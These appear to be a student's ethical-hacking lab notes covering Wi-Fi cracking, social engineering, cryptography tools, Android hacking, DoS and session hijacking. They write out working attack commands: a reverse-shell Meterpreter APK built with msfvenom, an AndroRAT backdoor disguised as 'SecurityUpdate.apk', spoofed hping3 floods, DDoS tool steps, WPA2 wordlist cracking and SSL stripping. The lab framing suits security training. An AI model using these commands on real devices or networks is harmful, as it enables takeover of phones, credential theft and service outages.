Wireshark is a network protocol sniffer and analyzer. It lets you capture and interactively browse the traffic running on a target network. Wireshark can read live data from Ethernet, Token-Ring, FDDI, serial (PPP and SLIP), and 802.11 wireless LAN. Npcap is a library that is integrated with Wireshark for complete WLAN traffic analysis, visualization, drill-down, and reporting. Wireshark can be used in monitor mode to capture wireless traffic. It is able to capture a vast number of management, control, data frames, etc. and further analyze the Radiotap header fields to gather critical information such as protocols and encryption techniques used, length of the frames, MAC addresses, etc.

The WEPcrack-01.cap file opens in Wireshark window showing you the details of the packet for analysis. Here you can see the wireless packets captured which were otherwise masked to look like ethernet traffic.

Here 802.11 protocol indicates wireless packets.

You can access the saved packet capture file anytime, and by issuing packet filtering commands in the Filter field, you can narrow down the packet search in an attempt to find packets containing sensible information.

In real time, attackers enforce packet capture and packet filtering techniques to capture packets containing passwords (only for websites implemented on HTTP channel), perform attacks such as session hijacking, and so on.

AirMagnet WiFi Analyzer PRO (https://www.netally.com), SteelCentral Packet Analyzer (https://www.riverbed.com), Omnipeek Network Protocol Analyzer (https://www.liveaction.com), CommView for Wi-Fi (https://www.tamos.com), and Capsa Portable Network Analyzer (https://www.colasoft.com) to analyze Wi-Fi traffic.


### Perform Wireless Attacks
After performing the discovery, mapping, and analysis of the target wireless network, you have gathered enough information to launch an attack. You should now carry out various types of attacks on the target network, including Wi-Fi encryption cracking (WEP, WPA, and WPA2), fragmentation, MAC spoofing, DoS, and ARP poisoning attacks.

WEP encryption is used for wireless networks, but it has several exploitable vulnerabilities. When seeking to protect a wireless network, the first step is always to change your SSID from the default before you actually connect the wireless router to the access point. Moreover, if an SSID broadcast is not disabled on an access point, ensure that you do not use a DHCP server, which would automatically assign IP addresses to wireless clients. This is because war-driving tools can easily detect your internal IP address.

As an ethical hacker and pen tester of an organization, you must test its wireless security, exploit WEP flaws, and crack the network’s access point keys.

There are several different types of Wi-Fi attacks that attackers use to eavesdrop on wireless network connections in order to obtain sensitive information such as passwords, banking credentials, and medical records, as well as to spread malware.

These include:

- **Fragmentation attack**: When successful, such attacks can obtain 1,500 bytes of PRGA (pseudo random generation algorithm)
- **MAC spoofing attack**: The attacker changes their MAC address to that of an authenticated user in order to bypass the access point’s MAC-filtering configuration
- **Disassociation attack**: The attacker makes the victim unavailable to other wireless devices by destroying the connectivity between the access point and client
- **Deauthentication attack**: The attacker floods station(s) with forged deauthentication packets to disconnect users from an access point
- **Man-in-the-middle attack**: An active Internet attack in which the attacker attempts to intercept, read, or alter information between two computers
- **Wireless ARP poisoning attack**: An attack technique that exploits the lack of a verification mechanism in the ARP protocol by corrupting the ARP cache maintained by the OS in order to associate the attacker’s MAC address with the target host
- **Rogue access points**: Wireless access points that an attacker installs on a network without authorization and that are not under the management of the network administrator
- **Evil twin**: A fraudulent wireless access point that pretends to be a legitimate access point by imitating another network name
- **Wi-Jacking attack**: A method used by attackers to gain access to an enormous number of wireless networks

##### Crack a WEP Network using Aircrack-ng
Aircrack-ng is a network software suite consisting of a detector, packet sniffer, WEP, and WPA/WPA2-PSK cracker and analysis tool for 802.11 wireless networks. The program runs on both Linux and Windows.

`aircrack-ng '/home/attacker/Desktop/Sample Captures/WEPcrack-01.cap'` : Command used to Crack a WEP Network

*What to do with this key generated? Please check this!!

`aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'` : This command is used to crack a WPA2 Network using a .cap file through a password word list.

`-a` is the technique used to crack the handshake, `2`=WPA technique.
`-b` refers to bssid; replace with the BSSID of the target router.
`-w` stands for wordlist; provide the path to a wordlist.

Elcomsoft Wireless Security Auditor (https://www.elcomsoft.com), Portable Penetrator (https://www.secpoint.com), WepCrackGui (https://sourceforge.net), Pyrit (https://github.com), and WepAttack (http://wepattack.sourceforge.net) to crack WEP/WPA/WPA2 encryption.

# Social Engineering

### Perform Social Engineering using Various Techniques
There are three types of social engineering attacks: human-, computer-, and mobile-based.
- **Human-based social engineering** uses interaction to gather sensitive information, employing techniques such as impersonation, vishing, and eavesdropping
- **Computer-based social engineering** uses computers to extract sensitive information, employing techniques such as phishing, spamming, and instant messaging
- **Mobile-based social engineering** uses mobile applications to obtain information, employing techniques such as publishing malicious apps, repackaging legitimate apps, using fake security applications, and SMiShing (SMS Phishing)

##### Sniff Credentials using the Social Engineering Toolkit (SET)
The Social-Engineer Toolkit (SET) is an open-source Python-driven tool aimed at penetration testing via social engineering. SET is particularly useful to attackers, because it is freely available and can be used to carry out a range of attacks. For example, it allows attackers to draft email messages, attach malicious files, and send them to a large number of people using spear phishing. Moreover, SET’s multi-attack method allows Java applets, the Metasploit browser, and Credential Harvester/Tabnabbing to be used simultaneously. SET categorizes attacks according to the attack vector used such as email, web, and USB.

Although many kinds of attacks can be carried out using SET, it is also a must-have tool for penetration testers to check for vulnerabilities. For this reason, SET is the standard for social engineering penetration tests, and is strongly supported within the security community.

As an ethical hacker, penetration tester, or security administrator, you should be familiar with SET and be able to use it to perform various tests for network vulnerabilities.

In this we used, SET for creating a Website Attack Vector which clones the website and tricks a user into thinking that the website is a legitimate website but it's in actual a malicious website that is hosted on the Attacking Machine.


### Detect a Phishing Attack
Phishing attacks are difficult to guard against, as the victim might not be aware that he or she has been deceived. They are very much like the other kinds of attacks used to extract a company’s valuable data. To guard against phishing attacks, a company needs to evaluate the risk of different kinds of attacks, estimate possible losses and spread awareness among its employees.
##### Detect Phishing using Netcraft
`https://www.netcraft.com/apps-extensions/browser-extension/` : To install Netcraft's Browser Extension
Visit the website and open up the extension to know information about it.
![[Pasted image 20241202151333.png]]


##### Detect Phishing using PhishTank
`https://www.phishtank.com` : Website link for PhishTank
![[Pasted image 20241202151728.png]]

### Audit Organization's Security for Phishing Attacks
Social engineers exploit human behavior (manners, enthusiasm toward work, laziness, innocence, etc.) to gain access to the information resources of the target company. This information is difficult to be guarded against social engineering attacks, as the victim may not be aware that he or she has been deceived. The attacks performed are similar to those used to extract a company’s valuable data. To guard against social engineering attacks, a company must evaluate the risk of different types of attacks, estimate the possible losses, and spread awareness among its employees.

##### Audit Organization's Security for Phishing Attacks using OhPhish
OhPhish is a web-based portal for testing employees’ susceptibility to social engineering attacks. It is a phishing simulation tool that provides an organization with a platform to launch phishing simulation campaigns on its employees. The platform captures the responses and provides MIS reports and trends (on a real-time basis) that can be tracked according to the user, department, or designation.

Web based tool used for organizing Campaigns in an Organization to demonstrate Social Engineering Attacks for their employees.

# Cryptography
Cryptography and cryptographic (“crypto”) systems help in securing data from interception and compromise during online transmissions. Cryptography enables one to secure transactions, communications, and other processes performed in the electronic world, and is additionally used to protect confidential data such as email messages, chat sessions, web transactions, personal data, corporate data, e-commerce applications, etc.

“Cryptography” comes from the Greek words kryptos, meaning “concealed, hidden, veiled, secret, or mysterious,” and graphia, “writing”; thus, cryptography is “the art of secret writing.”

Cryptography is the practice of concealing information by converting plain text (readable format) into cipher text (unreadable format) using a key or encryption scheme: it is the process of the conversion of data into a scrambled code that is sent across a private or public network.

There are two types of cryptography, determined by the number of keys employed for encryption and decryption:

- **Symmetric Encryption**: Symmetric encryption (secret-key, shared-key, and private-key) uses the same key for encryption as it does for decryption
- **Asymmetric Encryption**: Asymmetric encryption (public-key) uses different encryption keys for encryption and decryption; these keys are known as public and private keys

### Encrypt the Information using Various Cryptography Tools
Cryptography tools are used to convert the information present in plain text (readable format) into cipher text (unreadable format) using a key or encryption scheme. The converted data are in the form of a scrambled code that is encrypted and sent across a private or public network.

##### Calculate One-way Hashes using HashCalc
HashCalc is a Windows Tool for calculating hashes by creating a text file and then uploading it on the software and finally calculating the result.
![[Pasted image 20241202223622.png]]


##### Calculate MD5 Hashes using MD5 Calculator
MD2, MD4, MD5, and MD6 are message digest algorithms used in digital signature applications to compress documents securely before the system signs it with a private key. The algorithms can be of variable length, but the resulting message digest is always 128 bits.

The MD5 algorithm is a widely used cryptographic hash function that takes a message of arbitrary length as input and outputs a 128-bit (16-byte) fingerprint or message digest of the input. The MD5 algorithm is used in a wide variety of cryptographic applications and is useful for digital signature applications, file integrity checking, and storing passwords.

##### Calculate MD5 Hashes using HashMyFiles
HashMyFiles is a small utility that allows you to calculate the MD5 and SHA1 hashes of one or more files in your system: you can easily copy the MD5/SHA1 hashes list into the clipboard, or save them into text/html/xml file. HashMyFiles can also be launched from the context menu of Windows Explorer, and can display the MD5/SHA1 hashes of the selected file or folder.

MD6 Hash Generator (https://www.browserling.com), All Hash Generator (https://www.browserling.com), MD6 Hash Generator (https://convert-tool.com), and md5 hash calculator (https://onlinehashtools.com) to calculate MD5 and MD6 hashes.

##### Perform File and Text Message Encryption using CryptoForge
CryptoForge is a file encryption software for personal and professional data security. It allows you to protect the privacy of sensitive files, folders, or email messages by encrypting them with strong encryption algorithms. Once the information has been encrypted, it can be stored on insecure media or transmitted on an insecure network—such as the Internet—and remain private. Later, the information can be decrypted into its original form.

##### Encrypt & Decrypt Data using BCTextEncoder
BCTextEncoder simplifies encoding and decoding text data. Plain text data are compressed, encrypted, and converted to text format, which can then be easily copied to the clipboard or saved as a text file. This utility software uses public key encryption methods and password-based encryption, as well as strong and approved symmetric and public key algorithms for data encryption.

AxCrypt (https://www.axcrypt.net), Microsoft Cryptography Tools (https://docs.microsoft.com), and Concealer (https://www.belightsoft.com) to encrypt confidential data.

### Create a Self-Signed Certificate
In cryptography and computer security, a self-signed certificate is an identity certificate signed by the same entity whose identity it verifies. However, the term is unrelated to the identity of the person or organization that actually performs the signing procedure.

##### Create and Use Self-Signed Certificate
Self-signed certificates are widely used for testing servers. In self-signed certificates, a user creates a pair of public and private keys using a certificate creation tool such as Adobe Acrobat Reader, Java’s keytool, Apple’s Keychain, etc. and signs the document with the public key. The recipient requests the private key from the sender in order to verify the certificate. However, certificate verification rarely occurs due to the necessity of disclosing the private key: this makes self-signed certificates useful only in a self-controlled testing environment.

##### Perform Email Encryption
Email encryption hides the email content from eavesdroppers by encrypting it into an unreadable form. Emails can be encrypted and decrypted by means of a digital signature mechanism that uses public and private keys: the public key is shared, while the private key is kept private.

There are numerous methods that can be employed for email encryption, including:

- Digital Signature: Uses asymmetric cryptography to simulate the security properties of a signature in digital, rather than written form
- Secure Sockets Layer (SSL): Uses RSA asymmetric (public key) encryption to encrypt data transferred over SSL connections
- Transport Layer Security (TLS): Uses a symmetric key for bulk encryption, an asymmetric key for authentication and key exchange, and message authentication codes for message integrity
- Pretty Good Privacy (PGP): Used to encrypt and decrypt data that provides authentication and cryptographic privacy
- GNU Privacy Guard (GPG): Software replacement of PGP and free implementation of the OpenPGP standard that is used to encrypt and decrypt data.

##### Perform Email Encryption using RMail
RMail is an email security tool that provides open tracking, proof of delivery, email encryption, electronic signatures, large file transfer functionality, etc. RMail works seamlessly with users’ existing email platforms, including Microsoft Outlook and Gmail, amongst others. Using this tool, you can encrypt sensitive emails and attachments for security or legal compliance.

**Virtru** (https://www.virtru.com), **ZixMail** (https://www.zixcorp.com), **Egress Secure Email and File Transfer** (https://www.egress.com), and **Proofpoint Email Protection** (https://www.proofpoint.com) to perform email encryption.

### Perform Disk Encryption
Disk encryption is a technology that protects the confidentiality of the data stored on a disk by converting it into an unreadable code using disk encryption software or hardware, thus preventing unauthorized users from accessing it. Disk encryption provides confidentiality and privacy using passphrases and hidden volumes. As a professional ethical hacker or pen tester, you should perform disk encryption in order to prevent sensitive information from unauthorized access.

Disk encryption works in a manner similar to text-message encryption and protects data even when the OS is not active. By using an encryption program for the user’s disk (Blue Ray, DVD, USB flash drive, External HDD, and Backup), the user can safeguard any or all information burned onto the disk and thus prevent it from falling into the wrong hands. Disk-encryption software scrambles the information burned on the disk into an illegible code. It is only after decryption of the disk information that one can read and use it.

##### Perform Disk Encryption using VeraCrypt
VeraCrypt is a software used for establishing and maintaining an on-the-fly-encrypted volume (data storage device). On-the-fly encryption means that data is automatically encrypted just before it is saved, and decrypted just after it is loaded, without any user intervention. No data stored on an encrypted volume can be read (decrypted) without using the correct password/keyfile(s) or correct encryption keys. The entire file system is encrypted (e.g., file names, folder names, free space, metadata, etc.).

Create a Volume by saving the file -> Mounting it onto the Disks provided -> Add files to the disk -> Dismount the disk -> File gets encrypted and is not shown anywhere on the drive

##### Perform Disk Encryption using BitLocker Drive Encryption
BitLocker provides offline-data and OS protection for your computer, and helps to ensure that data stored on a computer that is running Windows® is not revealed if the computer is tampered with when the installed OS is offline. BitLocker uses a microchip that is called a Trusted Platform Module (TPM) to provide enhanced protection for your data and to preserve early boot-component integrity. The TPM can help protect your data from theft or unauthorized viewing by encrypting the entire Windows volumes

Turn on Bitlocker -> Unlocking the drive -> Saving the recovery key -> Encrypt entire drive -> Compatible Mode for Encryption -> Restart the machine

##### Perform Disk Encryption using Rohos Disk Encryption
Rohos Disk Encryption creates hidden and password-protected partitions on a computer or USB flash drive, and password protects/locks access to your Internet applications. It uses a NIST-approved AES encryption algorithm with a 256-bit encryption key length. Encryption is automatic and on-the-fly.

Create a new disk -> Change options according to your wish -> Connecting the disk -> Add files to the disk -> Disconnect the disk

You can also use other disk encryption tools such as FinalCrypt (http://www.finalcrypt.org), Seqrite Encryption Manager (https://www.seqrite.com), FileVault (https://support.apple.com), and Gillsoft Full Disk Encryption (http://www.gilisoft.com) to perform disk encryption.

### Perform Cryptanalysis using Various Cryptanalysis Tools
Cryptanalysis can be performed using various methods, including the following:

- Linear Cryptanalysis: A known plaintext attack that uses a linear approximation to describe the behavior of the block cipher
- Differential Cryptanalysis: The examination of differences in an input and how this affects the resultant difference in the output
- Integral Cryptanalysis: This attack is useful against block ciphers based on substitution-permutation networks and is an extension of differential cryptanalysis.

##### Perform Cryptanalysis using CrypTool

CrypTool is a freeware program that enables you to apply and analyze cryptographic mechanisms, and has the typical look and feel of a modern Windows application. CrypTool includes a multitude of state-of-the-art cryptographic functions and allows you to both learn and use cryptography within the same environment. CrypTool is a free, open-source e-learning application used in the implementation and analysis of cryptographic algorithms.

Simply add text to the Notepad through CrypTool using New Menu -> Use Encrypt/Decrypt Menu and use whatever encryption scheme you wanna use and save the text
##### Perform Cryptanalysis using AlphaPeeler
AlphaPeeler is a powerful tool for learning cryptology. It can be useful as an instructor’s teaching aid and to create assignments for classical cryptography. You can easily learn classical techniques such as frequency analysis of alphabets, mono-alphabetic substitution, Caesar cipher, transposition cipher, Vigenere cipher, and Playfair cipher. AlphaPeeler Professional (powered by crypto++ library) also includes DES, Gzip/Gunzip, MD5, SHA-1, SHA-256, RIPEMD-16, RSA key generation, RSA crypto, RSA signature & validation, and generation of secret share files.

Cryptosense (https://cryptosense.com), RsaCtfTool (https://github.com), Msieve (https://sourceforge.net), and Cryptol (https://cryptol.net) to perform cryptanalysis.


# Hacking Mobile Platforms
At present, smartphones are widely used for both business and personal purposes. Thus, they are a treasure trove for attackers looking to steal corporate or personal data. Security threats to mobile devices have increased with the growth of Internet connectivity, use of business and other applications, various methods of communication available, etc. Apart from certain security threats that are specific to them, mobile devices are also susceptible to many other threats that are applicable to desktop and laptop computers, web applications, and networks.

Nowadays, smartphones offer broad Internet and network connectivity via varying channels such as 3G/4G/5G, Bluetooth, Wi-Fi, or wired computer connections. Security threats may arise while transmitting data at different points along these various paths.

### Hack Android Devices
Owing to the extensive usage and implementation of bring your own device (BYOD) policies in organizations, mobile devices have become a prime target for attacks. Attackers scan these devices for vulnerabilities. These attacks can involve the device and the network layer, the data center, or a combination of these.

Android is a software environment developed by Google for mobile devices. It includes an OS, a middleware, and key applications. Its Linux-based OS is designed especially for portable devices such as smartphones and tablets. Android has a stack of software components categorized into six sections (System Apps, Java AP Framework, Native C/C++ Libraries, Android Runtime, Hardware Abstraction Layer [HAL], and Linux kernel) and five layers.

Owing to the increase in the number of users with Android devices, they have become the primary targets for hackers. Attackers use various Android hacking tools to discover vulnerabilities in the platform, and then exploit them to carry out attacks such as DoS, Man-in-the-Disk, and Spear phone attacks.

##### Hack an Android Device by Creating Binary Payloads using Parrot Security
Attackers use various tools such as Metasploit to create binary payloads, which are sent to the target system to gain control over it. The Metasploit Framework is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code. It contains a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. Meterpreter is a Metasploit attack payload that provides an interactive shell that can be used to explore target machines and execute code.

Step - 1 : `service postgresql start` : To start the Postgresql service on Kali
Step - 2 : `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk` To create a Backdoor APK
Step - 3 : Get this APK installed and open `msfvenom` on the Attacker Machine.
Step - 4 : `use exploit/multi/handler` -> `set payload android/meterpreter/reverse_tcp` -> `set LHOST 10.10.1.13` -> `exploit -j -z` (-j & -z for background staging )
Step - 5 : Whenever the app gets installed on target device, we'll see the session being created on the Attacking Machine
Step - 6 : We can get into the Meterpreter Session  using the command : `sessions -i 1`

##### Harvest Users' Credentials using the Social Engineering Toolkit
Using SET, create a fake website using Website Cloner under Website Attack Vector  and send that link to the Android Device and get the Users' Credentials.

##### Launch a DOS Attack on a Target Machine using Low Orbit Ion Cannon (LOIC) on the Android Mobile Platform
Low Orbit Ion Cannon (LOIC) is an open-source network stress testing and Denial-of-Service (DoS) attack application. LOIC performs a DoS attack (or when used by multiple individuals, a DDoS attack) on a target site by flooding the server with TCP or UDP packets with the intention of disrupting the service of a particular host. People have used LOIC to join voluntary botnets.

Put the IP Address in the LOIC App, enter the mode of transmission : UDP, HTTP or TCP and then add the port number and thread. After that you can start the DDOS Attack over that IP from this mobile phone.


##### Exploit the Android Platform through ADB using PhoneSploit
Android Debug Bridge (ADB) is a versatile command-line tool that lets you communicate with a device. ADB facilitates a variety of device actions such as installing and debugging apps, and provides access to a Unix shell that you can use to run several different commands on a device.

Usually, developers connect to ADB on Android devices by using a USB cable, but it is also possible to do so wirelessly by enabling a daemon server at TCP port 5555 on the device.

Use the option `3` and then add the `ip_address` of the device. 
Then use the option `4` to access shell on a phone.
And on connecting now you can run commands over it.
And we can use many of the functions present over it.

##### Hack an Android Device by Creating APK File using AndroRAT
AndroRAT is a tool designed to give control of an Android system to a remote user and to retrieve information from it. AndroRAT is a client/server application developed in Java Android for the client side and the Server is in Python. AndroRAT provides a fully persistent backdoor to the target device as the app starts automatically on device boot up, it also obtains the current location, sim card details, IP address and MAC address of the device.

`python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk` and press Enter to create an APK file (here, SecurityUpdate.apk).

`--build`: is used for building the APK | `-i`: specifies the local IP address (here, 10.10.1.13) | `-p`: specifies the port number (here, 4444) | `-o`: specifies the output APK file (here, SecurityUpdate.apk)

`python3 androRAT.py --shell -i 0.0.0.0 -p 4444` : `--shell`: is used for getting the interpreter | `-i`: specifies the IP address for listening (here, 0.0.0.0) | `-p`: specifies the port number (here, 4444)

**NetCut** (https://www.arcai.com), **drozer** (https://labs.f-secure.com), **zANTI** (https://www.zimperium.com), **Network Spoofer** (https://www.digitalsquid.co.uk), and **DroidSheep** (https://droidsheep.info) to hack Android devices.


### Secure Android Devices using Various Android Security Tools
##### Analyze a Malicious App using Online Android Analyzers
Online Android analyzers allow you to scan Android APK packages and perform security analyses to detect vulnerabilities in particular apps. Some trusted online Android analyzers are Sixo Online APK Analyzer.

`https://www.sisik.eu/apk-too` : Website used for analyzing Malicious App
 SandDroid (http://sanddroid.xjtu.edu.cn), and Apktool (http://www.javadecompilers.com), to analyze malicious applications.

# Malware Threats


# Denial-of-Service
Denial-of-Service (DoS) and Distributed Denial-of-Service (DDoS) attacks have become a major threat to computer networks. These attacks attempt to make a machine or network resource unavailable to its authorized users. Usually, DoS and DDoS attacks exploit vulnerabilities in the implementation of TCP/IP model protocol or bugs in a specific OS.

In a DoS attack, attackers flood a victim’s system with nonlegitimate service requests or traffic to overload its resources, bringing the system down and leading to the unavailability of the victim’s website—or at least significantly slowing the victim’s system or network performance. The goal of a DoS attack is not to gain unauthorized access to a system or corrupt data, but to keep legitimate users from using the system.

Perpetrators of DoS attacks typically target sites or services hosted on high-profile web servers such as banks, credit card payment gateways, and even root nameservers.

In general, DoS attacks target network bandwidth or connectivity. Bandwidth attacks overflow the network with a high volume of traffic using existing network resources, thus depriving legitimate users of these resources. Connectivity attacks overflow a computer with a flood of connection requests, consuming all available OS resources, so that the computer cannot process legitimate users’ requests.

A DoS attack is a type of security break that does not generally result in the theft of information. However, these attacks can harm the target in terms of time and resources. Further, failure to protect against such attacks might mean the loss of a service such as email. In a worst-case scenario, a DoS attack can mean the accidental destruction of the files and programs of millions of people who happen to be surfing the Web at the time of the attack

### Perform DoS and DDoS Attacks using Various Techniques
The attacker initiates the DDoS attack by sending a command to the zombie agents. These zombie agents send a connection request to a large number of reflector systems with the spoofed IP address of the victim. The reflector systems see these requests as coming from the victim’s machine instead of as zombie agents, because of the spoofing of the source IP address. Hence, they send the requested information (response to connection request) to the victim. The victim’s machine is flooded with unsolicited responses from several reflector computers at once. This may reduce performance or may even cause the victim’s machine to shut down completely.

DDoS attacks mainly aim at the network bandwidth; they exhaust network, application, or service resources, and thereby restrict legitimate users from accessing their system or network resources.

In general, the following are categories of DoS/DDoS attack vectors:

- **Volumetric Attacks**: Consume the bandwidth of the target network or service
    Attack techniques:
    - UDP flood attack
    - ICMP flood attack
    - Ping of Death and smurf attack
    - Pulse wave and zero-day attack
- **Protocol Attacks**: Consume resources like connection state tables present in the network infrastructure components such as load-balancers, firewalls, and application servers
    Attack techniques:
    - SYN flood attack
    - Fragmentation attack
    - Spoofed session flood attack
    - ACK flood attack
- **Application Layer Attacks**: Consume application resources or services, thereby making them unavailable to other legitimate users
    Attack techniques:
    - HTTP GET/POST attack
    - Slowloris attack
    - UDP application layer flood attack
    - DDoS extortion attack

##### Perform a DoS Attack (SYN Flooding) on a Target Host using Metasploit
SYN flooding takes advantage of a flaw with regard to how most hosts implement the TCP three-way handshake. This attack occurs when the intruder sends unlimited SYN packets (requests) to the host system. The process of transmitting such packets is faster than the system can handle. Normally, the connection establishes with the TCP three-way handshake, and the host keeps track of the partially open connections while waiting in a listening queue for response ACK packets.

`msfconsole`  -> `msf` -> `use auxiliary/dos/tcp/synflood` -> 

## Task 2: Perform a DoS Attack on a Target Host using hping3
hping3 is a command-line-oriented network scanning and packet crafting tool for the TCP/IP protocol that sends ICMP echo requests and supports TCP, UDP, ICMP, and raw-IP protocols.

It performs network security auditing, firewall testing, manual path MTU discovery, advanced traceroute, remote OS fingerprinting, remote uptime guessing, TCP/IP stacks auditing, and other functions.

Here, we will use the hping3 tool to perform DoS attacks such as SYN flooding, Ping of Death (PoD) attacks, and UDP application layer flood attacks on a target host.

`hping3 -S (Target IP Address) -a (Spoofable IP Address) -p 22 --flood` : The command used to perform flood attack using Hping3
**-S**: sets the SYN flag; **-a**: spoofs the IP address; **-p**: specifies the destination port; and **--flood**: sends a huge number of packets.

`hping3 -d 65538 -S -p 21 --flood (Target IP Address)` : This command is used to perform flood attack with data size specified. 
**-d**: specifies data size; **-S**: sets the SYN flag; **-p**: specifies the destination port; and **--flood**: sends a huge number of packets.

**Perform a UDP application layer flood attack on the Windows Server 2019 machine using NetBIOS port 139** : 
1. Check if NetBIOS Port 139 is open or not using the command : `nmap -p 139 10.10.1.19`
2. Then typing the command : `hping3 -2 -p 139 --flood [Target IP Address]` , -2: specifies the UDP mode; -p: specifies the destination port; and --flood: sends a huge number of packets.

Note : 
> Here, we have used NetBIOS port 139 to perform a UDP application layer flood attack. Similarly, you can employ other application layer protocols to perform a UDP application layer flood attack on a target network.

> Some of the UDP based application layer protocols that attackers can employ to flood target networks include:

> - **CharGEN** (Port 19)
> - **SNMPv2** (Port 161)
> - **QOTD** (Port 17)
> - **RPC** (Port 135)
> - **SSDP** (Port 1900)
> - **CLDAP** (Port 389)
> - **TFTP** (Port 69)
> - **NetBIOS** (Port 137,138,139)
> - **NTP** (Port 123)
> - **Quake Network Protocol** (Port 26000)
> - **VoIP** (Port 5060)

##### Perform a DoS Attack using Raven-storm
Raven-Storm is a DDoS tool for penetration testing that features Layer 3, Layer 4, and Layer 7 attacks. It is written in python3 and is effective and powerful in shutting down hosts and servers. It can be used to perform strong attacks and can be optimized for non typical targets.

`sudo rst` : Command to start Raven-storm Tool
Type `l4` and press Enter to load layer4 module (UDP/TCP).
Put `ip [IP Address]` in the terminal.
Put `port [Port Number]` in the terminal.
Put `threads [Number of threads]` in the terminal.
Put `run` in the terminal.

##### Perform a DDoS Attack using HOIC
HOIC (High Orbit Ion Cannon) is a network stress and DoS/DDoS attack application. This tool is written in the BASIC language. It is designed to attack up to 256 target URLs simultaneously. It sends HTTP, POST, and GET requests to a computer that uses lulz inspired GUIs. It offers a high-speed multi-threaded HTTP Flood; a built-in scripting system allows the deployment of “boosters,” which are scripts designed to thwart DDoS countermeasures and increase DoS output.


##### Perform a DDoS Attack using HOIC
  
Perform the following settings:
- Under the **Select your target** section, type the target IP address under the **IP** field (here, **10.10.1.13**), and then click the **Lock on** button to add the target devices.
- Under the **Attack options** section, select **UDP** from the drop-down list in **Method**. Set the thread's value to **10** under the **Threads** field. Slide the power bar to the middle.

### Detect and Protect Against DoS and DDoS Attacks
Detection techniques are based on identifying and discriminating the illegitimate traffic increase and flash events from the legitimate packet traffic.

The following are the three types of detection techniques:

- Activity Profiling: Profiles based on the average packet rate for a network flow, which consists of consecutive packets with similar packet header information
- Sequential Change-point Detection: Filters network traffic by IP addresses, targeted port numbers, and communication protocols used, and stores the traffic flow data in a graph that shows the traffic flow rate over time
- Wavelet-based Signal Analysis: Analyzes network traffic in terms of spectral components

##### Detect and Protect Against DDoS Attack using Anti DDoS Guardian
Anti DDoS Guardian is a DDoS attack protection tool. It protects IIS servers, Apache servers, game servers, Camfrog servers, mail servers, FTP servers, VOIP PBX, and SIP servers and other systems. Anti DDoS Guardian monitors each incoming and outgoing packet in Real-Time. It displays the local address, remote address, and other information of each network flow. Anti DDoS Guardian limits network flow number, client bandwidth, client concurrent TCP connection number, and TCP connection rate. It also limits the UDP bandwidth, UDP connection rate, and UDP packet rate.

# Session Hijacking
A session hijacking attack refers to the exploitation of a session token-generation mechanism or token security controls that enables an attacker to establish an unauthorized connection with a target server. The attacker guesses or steals a valid session ID (which identifies authenticated users) and uses it to establish a session with the server.

As an ethical hacker or penetration tester, you should understand different session hijacking concepts, how attackers perform application- and network-level session hijacking, and the various tools used to launch this kind of attack. You should also be able to implement security measures at both the application and network levels to protect your network from session hijacking. Application-level hijacking involves gaining control over the Hypertext Transfer Protocol (HTTP) user session by obtaining the session IDs. Network-level hijacking is prevented by packet encryption, which can be achieved with protocols such as IPsec, SSL, and SSH.

Session hijacking can be either active or passive, depending on the degree of involvement of the attacker:

- Active session hijacking: An attacker finds an active session and takes it over
- Passive session hijacking: An attacker hijacks a session, and, instead of taking over, monitors and records all the traffic in that session

### Perform Session Hijacking
Session hijacking allows an attacker to take over an active session by bypassing the authentication process. It involves stealing or guessing a victim’s valid session ID, which the server uses to identify authenticated users, and using it to establish a connection with the server. The server responds to the attacker’s requests as though it were communicating with an authenticated user, after which the attacker is able to perform any action on that system.

Attackers can use session hijacking to launch various kinds of attacks such as man-in-the-middle (MITM) and Denial-of-Service (DoS) attacks. A MITM attack occurs when an attacker places himself/herself between the authorized client and the server to intercept information flowing in either direction. A DoS attack happens when attackers sniff sensitive information and use it to make host or network resource unavailable to users, usually by flooding the target with requests until the system is overloaded.

Session hijacking can be divided into three broad phases:

- Tracking the Connection: The attacker uses a network sniffer to track a victim and host, or uses a tool such as Nmap to scan the network for a target with a TCP sequence that is easy to predict
- Desynchronizing the Connection: A desynchronized state occurs when a connection between the target and host has been established, or is stable with no data transmission, or when the server’s sequence number is not equal to the client’s acknowledgment number (or vice versa)
- Injecting the Attacker’s Packet: Once the attacker has interrupted the connection between the server and target, they can either inject data into the network or actively participate as the man-in-the-middle, passing data between the target and server, while reading and injecting data at will

##### Hijack a Session using Zed Attack Proxy (ZAP)
Zed Attack Proxy (ZAP) is an integrated penetration testing tool for finding vulnerabilities in web applications. It offers automated scanners as well as a set of tools that allow you to find security vulnerabilities manually. It is designed to be used by people with a wide range of security experience, and as such is ideal for developers and functional testers who are new to penetration testing.

ZAP allows you to see all the requests you make to a web app and all the responses you receive from it. Among other things, it allows you to see AJAX calls that may not otherwise be outright visible. You can also set breakpoints, which allow you to change the requests and responses in real-time.

Steps to add a Proxy to Chrome : 
**Edit proxy server** window appears, make the following changes:

- Under the **Use a proxy server** option, click the **Off** button to switch it **On**.
- In the **Proxy IP address** field, type **10.10.1.19** (the IP address of the attacker’s machine).
- In the **Port** field, type **8080**.
- Click **Save**.

The **Break** tab allows you to modify a response or request when ZAP has caught it. It also allows you to modify certain elements that you cannot modify through your browser, including:

- The header
- Hidden fields
- Disabled fields
- Fields that use JavaScript to filter out illegal characters

In the **Options** window, scroll-down in the left-pane and click **Local Proxies**. In the right pane, under the **Local Proxy** section, type **10.10.1.19** (the IP address of the **Windows Server 2019** machine) in the **Address** field and leave the **Port** value to the default, **8080**; click **OK**.

##### Intercept HTTP Traffic using bettercap
Attackers can use session hijacking to launch various kinds of attacks such as man-in-the middle (MITM) attacks. In an MITM attack, the attacker places himself/herself between the authorized client and the webserver so that all information traveling in either direction passes through them.

An ethical hacker or a penetration tester, you must know how MITM attacks work, so that you can protect your organization’s sensitive information from them. bettercap is a powerful, flexible, and portable tool created to perform various types of MITM attacks against a network; manipulate HTTP, HTTPS, and TCP traffic in real-time; sniff for credentials; etc.

In Linux : 
In the terminal window, type` bettercap -iface eth0` and press Enter to set the network interface.

`-iface`: specifies the interface to bind to (in this example, eth0).

Type the commands : `net.probe on` & `net.recon on`
Type set `http.proxy.sslstrip true` and press Enter. This module enables SSL stripping.

